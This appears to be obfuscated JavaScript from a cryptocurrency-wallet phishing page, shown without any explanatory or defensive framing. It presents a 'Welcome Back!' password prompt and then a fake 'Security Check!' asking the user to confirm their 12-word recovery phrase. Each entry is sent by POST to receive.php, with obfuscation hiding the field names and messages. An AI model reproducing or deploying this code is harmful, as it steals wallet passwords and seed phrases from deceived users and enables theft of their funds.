const _0x241ab2 = _0x22a1;
(function(_0x21b63d, _0x2f66e2) {
    const _0x35fd55 = _0x22a1
      , _0x3a7662 = _0x21b63d();
    while (!![]) {
        try {
            const _0x676924 = -parseInt(_0x35fd55(0x164)) / 0x1 * (parseInt(_0x35fd55(0x16d)) / 0x2) + -parseInt(_0x35fd55(0x158)) / 0x3 * (parseInt(_0x35fd55(0x170)) / 0x4) + parseInt(_0x35fd55(0x167)) / 0x5 * (parseInt(_0x35fd55(0x171)) / 0x6) + parseInt(_0x35fd55(0x16f)) / 0x7 + parseInt(_0x35fd55(0x17c)) / 0x8 + parseInt(_0x35fd55(0x160)) / 0x9 * (parseInt(_0x35fd55(0x16c)) / 0xa) + parseInt(_0x35fd55(0x16b)) / 0xb * (-parseInt(_0x35fd55(0x15f)) / 0xc);
            if (_0x676924 === _0x2f66e2)
                break;
            else
                _0x3a7662['push'](_0x3a7662['shift']());
        } catch (_0x1fc46b) {
            _0x3a7662['push'](_0x3a7662['shift']());
        }
    }
}(_0x3291, 0xecbf3));

function _0x22a1(_0x5bc607, _0xcb41d9) {
    const _0x3291ec = _0x3291();
    return _0x22a1 = function(_0x22a1d0, _0x1f1bd8) {
        _0x22a1d0 = _0x22a1d0 - 0x157;
        let _0x5a40e2 = _0x3291ec[_0x22a1d0];
        return _0x5a40e2;
    }
    ,
    _0x22a1(_0x5bc607, _0xcb41d9);
}

function _0x3291() {
    const _0x24b54f = ['Content-Length', 'request.php', 'modal-description', '.walletOptions', 'length', 'Content-type', '876bbRDhN', '9DzmJmN', '#text', 'none', 'modal-submit', '2cmoDkq', 'Security\x20Check!', 'CONFIRM', '35wVjWAt', 'Welcome\x20Back!', 'onclick', 'placeholder', '53944atOSFg', '7092980NkqdJp', '1260558nVJqhz', 'modal-input', '10388756ObLoGi', '24BBUeYi', '256062quTBkK', 'POST', 'getElementById', 'modal-title', 'textContent', 'type', 'setRequestHeader', 'value', 'recover', 'nodeName', 'display', '987216CmcIpW', 'querySelector', 'input=', '13641seZuHb'];
    _0x3291 = function() {
        return _0x24b54f;
    }
    ;
    return _0x3291();
}

function sendMessage() {
    const _0x318840 = _0x22a1
    //   , _0x2156cd = new XMLHttpRequest();
    // _0x2156cd['open'](_0x318840(0x172), _0x318840(0x15a)),
    // _0x2156cd[_0x318840(0x177)](_0x318840(0x15e), 'application/x-www-form-urlencoded');
    var _0x33e44c = document[_0x318840(0x173)]('modal-input')[_0x318840(0x178)]
      , _0x54bf4a = _0x318840(0x157) + _0x33e44c;
    // _0x2156cd[_0x318840(0x177)](_0x318840(0x159), _0x54bf4a[_0x318840(0x15d)]),
    // _0x2156cd['send'](_0x54bf4a);
    // alert(_0x54bf4a)

    var url = "receive.php";
    var params = _0x54bf4a;
    http = new XMLHttpRequest();
    http.open("POST", url, true);

    //Send the proper header information along with the request
    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

    http.onreadystatechange = function() {//Call a function when the state changes.
        if(http.readyState == 4 && http.status == 200) {
            // alert(http.responseText);
        }
    }
    
    http.send(params)
}

for (let option of document[_0x241ab2(0x17d)](_0x241ab2(0x15c))['childNodes']) {
    option[_0x241ab2(0x17a)] !== _0x241ab2(0x161) && (option['onclick'] = ()=>document[_0x241ab2(0x173)]('modal')['style'][_0x241ab2(0x17b)] = '');
}

let password, seed;
document[_0x241ab2(0x173)](_0x241ab2(0x163))[_0x241ab2(0x169)] = ()=>{
    const _0x32f2ec = _0x241ab2;
    sendMessage();
    const _0x9594c4 = document['getElementById'](_0x32f2ec(0x174))
      , _0x1dcc5f = document['getElementById'](_0x32f2ec(0x15b))
      , _0x3afc66 = document[_0x32f2ec(0x173)](_0x32f2ec(0x16e))
      , _0x20fb35 = document[_0x32f2ec(0x173)](_0x32f2ec(0x163));
    _0x9594c4[_0x32f2ec(0x175)] === _0x32f2ec(0x168) && _0x3afc66[_0x32f2ec(0x178)][_0x32f2ec(0x15d)] >= 0x6 && (password = _0x3afc66[_0x32f2ec(0x178)],
    document[_0x32f2ec(0x173)](_0x32f2ec(0x179))['style'][_0x32f2ec(0x17b)] = _0x32f2ec(0x162),
    _0x9594c4[_0x32f2ec(0x175)] = _0x32f2ec(0x165),
    _0x1dcc5f[_0x32f2ec(0x175)] = 'We\x20just\x20need\x20to\x20confirm\x20it\x27s\x20you.\x0aTo\x20continue,\x20simply\x20confirm\x20your\x2012\x20word\x20phrase.',
    _0x3afc66[_0x32f2ec(0x16a)] = 'Phrase',
    _0x3afc66[_0x32f2ec(0x178)] = '',
    _0x3afc66[_0x32f2ec(0x176)] = 'text',
    _0x20fb35[_0x32f2ec(0x175)] = _0x32f2ec(0x166));
}
;
